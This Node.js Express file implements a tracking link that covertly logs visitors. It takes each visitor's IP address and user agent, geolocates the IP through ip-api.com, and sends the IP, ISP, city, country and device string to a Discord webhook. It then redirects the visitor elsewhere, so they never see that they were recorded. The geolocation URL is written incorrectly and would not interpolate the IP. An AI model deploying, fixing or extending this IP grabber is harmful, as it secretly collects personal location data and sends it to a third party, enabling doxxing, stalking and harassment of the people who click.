const express = require('express');
const axios = require('axios');
const app = express();

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 

app.get('/', async (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (clientIp && clientIp.includes(',')) {
        // FIXED: Selects the first string element [0] out of the array before trimming
        clientIp = clientIp.split(',')[0].trim();
    }

    if (clientIp === '::1' || clientIp === '127.0.0.1') {
        clientIp = '8.8.8.8'; 
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (DISCORD_WEBHOOK_URL) {
        try {
            const geoResponse = await axios.get(`http://ip-api.com{clientIp}?fields=61439`);
            const geoData = geoResponse.data;

            const discordPayload = {
                embeds: [{
                    title: "Visitor Logged",
                    color: 15548997, 
                    description: "A user has accessed the tracking link.",
                    fields: [
                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                    ],
                    footer: {
                        text: "System Monitor"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            axios.post(DISCORD_WEBHOOK_URL, discordPayload).catch(err => {
                console.error("Webhook Delivery Failed:", err.message);
            });

        } catch (error) {
            console.error("Geo Data Retrieval Error:", error.message);
        }
    }

    res.redirect(302, REDIRECT_URL);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
